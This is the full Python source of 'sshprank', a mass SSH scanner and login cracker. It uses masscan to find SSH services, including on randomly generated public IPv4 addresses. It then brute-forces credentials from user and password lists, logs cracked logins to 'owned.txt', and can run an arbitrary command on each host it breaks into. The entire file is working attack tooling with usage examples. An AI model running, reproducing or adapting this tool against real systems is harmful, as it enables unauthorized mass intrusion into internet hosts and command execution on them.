#!/usr/bin/python3
# -*- coding: utf-8 -*- ########################################################
#               ____                     _ __                                  #
#    ___  __ __/ / /__ ___ ______ ______(_) /___ __                            #
#   / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                            #
#  /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                             #
#                                           /___/ team                         #
#                                                                              #
# sshprank                                                                     #
# A fast SSH mass-scanner, login cracker and banner grabber tool using the     #
# python-masscan module.                                                       #
#                                                                              #
# NOTES                                                                        #
# quick'n'dirty code                                                           #
#                                                                              #
# AUTHOR                                                                       #
# noptrix                                                                      #
#                                                                              #
################################################################################

import getopt
import os
import sys
import socket
import time
import random
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
import logging
import masscan as masscan
import paramiko as paramiko
from collections import deque


__author__ = 'noptrix'
__version__ = '1.0.0'
__copyright = 'santa clause'
__license__ = 'MIT'


SUCCESS = 0
FAILURE = 1

NORM = '\033[0;37;40m'
BOLD = '\033[1;37;40m'
RED = '\033[1;31;40m'
GREEN = '\033[1;32;40m'
YELLOW = '\033[1;33;40m'
BLUE = '\033[1;34;40m'

BANNER = '--==[ sshprank by nullsecurity.net ]==--'
HELP = BOLD + '''usage''' + NORM + '''

  sshprank <mode> [opts] | <misc>

''' + BOLD + '''modes''' + NORM + '''

  -h <host:[ports]>     - single host to crack. multiple ports can be seperated
                          by comma, e.g.: 22,2022,22222 (default port: 22)

  -l <file>             - list of hosts to crack. format: <host>[:ports]. multiple
                          ports can be seperated by comma (default port: 22)

  -m <opts> [-r <num>]  - pass arbitrary masscan opts, portscan given hosts and
                          crack for logins. found sshd services will be saved to
                          'sshds.txt' in supported format for '-l' option and
                          even for '-b'. use '-r' for generating random ipv4
                          addresses rather than scanning given hosts. these
                          options are always on: '-sS -oX - --open'.
                          NOTE: if you intent to use the '--banner' option then
                          you need to specify '--source-ip <some_ipaddr>' which
                          is needed by masscan.

  -b <file>             - list of hosts to grab sshd banner from
                          format: <host>[:ports]. multiple ports can be
                          seperated by comma (default port: 22)

''' + BOLD + '''options''' + NORM + '''

  -r <num>              - generate <num> random ipv4 addresses, check for open
                          sshd port and crack for login (only with -m option!)
  -c <cmd>              - execute this <cmd> on host if login was cracked
  -u <user>             - single username (default: root)
  -U <file>             - list of usernames
  -p                    - single password (default: root)
  -P <file>             - list of passwords
  -C <file>             - list of user:pass combination
  -x <num>              - num threads for parallel host crack (default: 20)
  -s <num>              - num threads for parallel service crack (default: 10)
  -X <num>              - num threads for parallel login crack (default: 20)
  -B <num>              - num threads for parallel banner grabbing (default: 50)
  -T <sec>              - num sec for connect timeout (default: 2s)
  -R <sec>              - num sec for (banner) read timeout (default: 2s)
  -o <file>             - write found logins to file. format:
                          <host>:<port>:<user>:<pass> (default: owned.txt)
  -e                    - exit after first login was found. continue with other
                          hosts instead (default: off)
  -v                    - verbose mode. show found logins, sshds, etc.
                          (default: off)

''' + BOLD + '''misc''' + NORM + '''

  -H                    - print help
  -V                    - print version information

''' + BOLD + '''examples''' + NORM + '''

  # crack targets from a given list with user admin, pw-list and 20 host-threads
  $ ./sshprank -l sshds.txt -u admin -P /tmp/passlist.txt -x 20

  # first scan then crack from founds ssh services
  $ sudo ./sshprank -m '-p22,2022 --rate=5000 --source-ip 192.168.13.37 \\
    --range 192.168.13.1/24'

  # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
  # and crack login 'root:root' on found sshds
  $ sudo ./sshprank -m '-p22 --rate=1000' -r 1000 -v

  # grab banners and output to file with format supported for '-l' option
  $ ./sshprank -b hosts.txt > sshds2.txt
'''

opts = {
  'targets': [],
  'masscan_opts': '--open ',
  'cmd': None,
  'user': 'root',
  'pass': 'root',
  'hthreads': 20,
  'sthreads': 10,
  'lthreads': 20,
  'bthreads': 50,
  'ctimeout': 2,
  'rtimeout': 2,
  'logfile': 'owned.txt',
  'exit': False,
  'verbose': False
}


def log(msg='', _type='normal', esc='\n'):
  iprefix = BOLD + BLUE + '[+] ' + NORM
  gprefix = BOLD + GREEN + '[*] ' + NORM
  wprefix = BOLD + YELLOW + '[!] ' + NORM
  eprefix = BOLD + RED + '[-] ' + NORM

  if _type == 'normal':
    sys.stdout.write('{}'.format(msg))
  elif _type == 'verbose':
    sys.stdout.write('    > {}'.format(msg) + esc)
  elif _type == 'info':
    sys.stderr.write(iprefix + '{}'.format(msg) + esc)
  elif _type == 'good':
    sys.stderr.write(gprefix + '{}'.format(msg) + esc)
  elif _type == 'warn':
    sys.stderr.write(wprefix + '{}'.format(msg) + esc)
  elif _type == 'error':
    sys.stderr.write(eprefix + '{}'.format(msg) + esc)
    sys.exit(FAILURE)
  elif _type == 'spin':
    sys.stderr.flush()
    for i in ('-', '\\', '|', '/'):
      sys.stderr.write('\r' + BOLD + BLUE + '[' + i + '] ' + NORM + msg + ' ')
      time.sleep(0.025)

  return


def parse_target(target):
  if target.endswith(':'):
    target = target.rstrip(':')

  dtarget = {target.rstrip(): ['22']}

  if ':' in target:
    starget = target.split(':')
    if starget[1]:
      try:
        if ',' in starget[1]:
          ports = [p.rstrip() for p in starget[1].split(',')]
        else:
          ports = [starget[1].rstrip('\n')]
        ports = list(filter(None, ports))
        dtarget = {starget[0].rstrip(): ports}
      except ValueError as err:
        log(err.args[0].lower(), 'error')

  return dtarget


def parse_cmdline(cmdline):
  global opts

  try:
    _opts, _args = getopt.getopt(cmdline,
      'h:l:m:b:r:c:u:U:p:P:C:x:s:X:B:T:R:o:evVH')
    for o, a in _opts:
      if o == '-h':
        opts['targets'] = parse_target(a)
      if o == '-l':
        opts['targetlist'] = a
      if o == '-m':
        opts['masscan_opts'] += a
      if o == '-b':
        opts['targetlist'] = a
      if o == '-r':
        opts['random'] = int(a)
      if o == '-c':
        opts['cmd'] = a
      if o == '-u':
        opts['user'] = a
      if o == '-U':
        opts['userlist'] = a
      if o == '-p':
        opts['pass'] = a
      if o == '-P':
        opts['passlist'] = a
      if o == '-C':
        opts['combolist'] = a
      if o == '-x':
        opts['hthreads'] = int(a)
      if o == '-s':
        opts['sthreads'] = int(a)
      if o == '-X':
        opts['lthreads'] = int(a)
      if o == '-B':
        opts['bthreads'] = int(a)
      if o == '-T':
        opts['ctimeout'] = int(a)
      if o == '-R':
        opts['rtimeout'] = int(a)
      if o == '-o':
        opts['logfile'] = a
      if o == '-e':
        opts['exit'] = True
      if o == '-v':
        opts['verbose'] = True
      if o == '-V':
        log('sshprank v' + __version__, _type='info')
        sys.exit(SUCCESS)
      if o == '-H':
        log(HELP)
        sys.exit(SUCCESS)
  except (getopt.GetoptError, ValueError) as err:
    log(err.args[0].lower(), 'error')

  return


def check_argv(cmdline):
  modes = False
  needed = ['-h', '-l', '-m', '-b', '-H', '-V']

  if set(needed).isdisjoint(set(cmdline)):
    log('wrong usage dude, check help', 'error')

  if '-h' in cmdline:
    if '-l' in cmdline or '-m' in cmdline or '-b' in cmdline:
      modes = True
  if '-l' in cmdline:
    if '-h' in cmdline or '-m' in cmdline or '-b' in cmdline:
      modes = True
  if '-m' in cmdline:
    if '-h' in cmdline or '-l' in cmdline or '-b' in cmdline:
      modes = True
    #if not [s for s in cmdline if '--source-ip' in s]:
    #  log('--source-ip <some_ipaddr> is needed for -m option', 'error')
  if '-b' in cmdline:
    if '-h' in cmdline or '-l' in cmdline or '-m' in cmdline:
      modes = True

  if modes:
    log('choose only one mode', 'error')

  return


def check_argc(cmdline):
  if len(cmdline) == 0:
    log('use -H for help', 'error')

  return


def grab_banner(host, port):
  try:
    with socket.create_connection((host, port), opts['ctimeout']) as s:
      s.settimeout(opts['rtimeout'])
      banner = str(s.recv(1024).decode('utf-8')).strip()
      if not banner:
        banner = '<NO BANNER>'
      log(host + ':' + port + ':' + banner + '\n')
      s.settimeout(None)
  except socket.timeout:
    if opts['verbose']:
      log('socket timeout: ' + host + ':' + port, 'warn')
  except:
    if opts['verbose']:
      log('could not connect: ' + host + ':' + port, 'warn')
  finally:
    s.close()

  return


def portscan():
  try:
    m = masscan.PortScanner()
    m.scan(hosts='', ports='0', arguments=opts['masscan_opts'], sudo=True)
  except masscan.NetworkConnectionError as err:
    log('no sshds found or network unreachable', 'error')

  return m


def grep_service(scan, service='ssh', prot='tcp'):
  targets = []

  for h in scan.scan_result['scan'].keys():
    for p in scan.scan_result['scan'][h][prot]:
      if scan.scan_result['scan'][h][prot][p]['state'] == 'open':
        if scan.scan_result['scan'][h][prot][p]['services']:
          for s in scan.scan_result['scan'][h][prot][p]['services']:
            target = h + ':' + str(p) + ':' + s['banner'] + '\n'
            if opts['verbose']:
              log('found sshd: {}'.format(target), 'good', esc='')
            if service in s['name']:
              targets.append(target)
        else:
          if opts['verbose']:
            log('found sshd: {}:{}:<no banner grab>'.format(h, str(p)), 'good',
              esc='\n')
          targets.append(h + ':' + str(p) + ':<no banner grab>\n')

  return targets


def log_targets(targets, logfile):
  try:
    with open(logfile, 'a+') as f:
      f.writelines(targets)
  except (FileNotFoundError, PermissionError) as err:
    log(err.args[1].lower() + ': ' + logfile, 'error')

  return


def status(future, msg):
  while future.running():
    log(msg, 'spin')

  return


def crack_login(host, port, username, password):
  cli = paramiko.SSHClient()
  cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    cli.connect(host, port, username, password, timeout=opts['ctimeout'],
      allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
    login = '{0}:{1}:{2}:{3}'.format(host, port, username, password)
    log_targets(login + '\n', opts['logfile'])
    if opts['verbose']:
      log('found login: {}'.format(login), _type='good')
    if opts['cmd']:
      log('sending your ssh command', 'info')
      stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
      log('ssh command results', 'good')
      for line in stdout.readlines():
        log(line)
    return SUCCESS
  except paramiko.AuthenticationException as err:
    if opts['verbose']:
      if 'publickey' in str(err):
        reason = 'pubkey auth'
      elif 'Authentication failed' in str(err):
        reason = 'auth failed'
      elif 'Authentication timeout' in str(err):
        reason = 'auth timeout'
      else:
        reason = 'unknown'
      log('login failure: {0}:{1} ({2})'.format(host, port, reason), 'warn')
    else:
      pass
  except (paramiko.SSHException, socket.error):
    if opts['verbose']:
      log('could not connect: {0}:{1}'.format(host, port), 'warn')
  except Exception as err:
    if opts['verbose']:
      log('something went wrong: ' + str(err), 'warn')
  finally:
    cli.close()

  return


def run_threads(host, ports, val='single'):
  futures = deque()

  with ThreadPoolExecutor(opts['sthreads']) as e:
    for port in ports:
      futures.append(e.submit(crack_login, host, port, opts['user'],
        opts['pass']))

      with ThreadPoolExecutor(opts['lthreads']) as exe:
        if 'userlist' in opts:
          uf = open(opts['userlist'], 'r', encoding='latin-1')
        if 'passlist' in opts:
          pf = open(opts['passlist'], 'r', encoding='latin-1')
        if 'combolist' in opts:
          cf = open(opts['combolist'], 'r', encoding='latin-1')

        if 'userlist' in opts and 'passlist' in opts:
          for u in uf:
            pf = open(opts['passlist'], 'r', encoding='latin-1')
            for p in pf:
              futures.append(exe.submit(crack_login, host, port, u.rstrip(),
                p.rstrip()))

        if 'userlist' in opts and 'passlist' not in opts:
          for u in uf:
            futures.append(exe.submit(crack_login, host, port, u.rstrip(),
              opts['pass']))

        if 'passlist' in opts and 'userlist' not in opts:
          for p in pf:
            futures.append(exe.submit(crack_login, host, port, opts['user'],
              p.rstrip()))

        if 'combolist' in opts:
          for line in cf:
            try:
              l = line.split(':')
              futures.append(exe.submit(crack_login, host, port, l[0].rstrip(),
                l[1].rstrip()))
            except IndexError:
              log('combo list format: <user>:<pass>', 'error')

        if opts['exit']:
          for x in as_completed(futures):
            if x.result() == SUCCESS:
              os._exit(SUCCESS)

  return


def gen_ipv4addr():
  try:
    ip = ipaddress.ip_address('.'.join(str(
      random.randint(0, 255)) for _ in range(4)))
    if not ip.is_loopback and not ip.is_private and not ip.is_multicast:
      return str(ip)
  except:
    pass

  return


def crack_single():
  host, ports = list(opts['targets'].copy().items())[0]
  run_threads(host, ports)

  return


def crack_multi():
  with ThreadPoolExecutor(opts['hthreads']) as exe:
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      for line in f:
        host = line.rstrip()
        if ':' in line:
          host = line.split(':')[0]
          ports = [p.rstrip() for p in line.split(':')[1].split(',')]
        else:
          ports = ['22']
        exe.submit(run_threads, host, ports)

  return


def crack_random():
  ptargets = []

  for _ in range(opts['random']):
    ptargets.append(gen_ipv4addr())
  ptargets = [x for x in ptargets if x is not None]

  opts['masscan_opts'] += ' ' + ' '.join(ptargets)

  return


def crack_scan():
  global opts

  with ThreadPoolExecutor(1) as e:
    future = e.submit(portscan)
    status(future, 'scanning sshds')
  log('\n')
  targets = grep_service(future.result())

  if len(targets) > 0:
    opts['targetlist'] = 'sshds.txt'
    log_targets(targets, opts['targetlist'])
    log('saved found sshds to sshds.txt', 'good')
    log('cracking found targets', 'info')
    crack_multi()
  else:
    log('no sshds found :(', _type='warn')

  return


def check_banners():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      with ThreadPoolExecutor(opts['bthreads']) as exe:
        for line in f:
          target = parse_target(line)
          host = ''.join([*target])
          ports = target.get(host)
          for port in ports:
            f = exe.submit(grab_banner, host, port)
  except (FileNotFoundError, PermissionError) as err:
    log(err.args[1].lower() + ': ' + opts['targetlist'], 'error')

  return


def main(cmdline):
  sys.stderr.write(BANNER + '\n\n')
  check_argc(cmdline)
  parse_cmdline(cmdline)
  check_argv(cmdline)
  futures = deque()

  try:
    if '-h' in cmdline:
      log('cracking single target', 'info')
      crack_single()
    elif '-l' in cmdline:
      log('cracking multiple targets', 'info')
      crack_multi()
    elif '-m' in cmdline:
      if '-r' in cmdline:
        log('cracking random targets', 'info')
        crack_random()
        crack_scan()
      else:
        log('scanning and cracking targets', 'info')
        crack_scan()
    elif '-b' in cmdline:
      log('grabbing banners', 'info', esc='\n\n')
      check_banners()
  except KeyboardInterrupt:
     log('interrupted by user', _type='error')
  finally:
    log('done!', 'info')

  return


if __name__ == '__main__':
  logger = logging.getLogger()
  logger.disabled = True
  logger.setLevel(100)
  logger.propagate = False
  logging.disable(logging.ERROR)
  logging.disable(logging.FATAL)
  logging.disable(logging.CRITICAL)
  logging.disable(logging.DEBUG)
  logging.disable(logging.WARNING)
  logging.disable(logging.INFO)
  if not sys.warnoptions:
    warnings.simplefilter('ignore')

  main(sys.argv[1:])

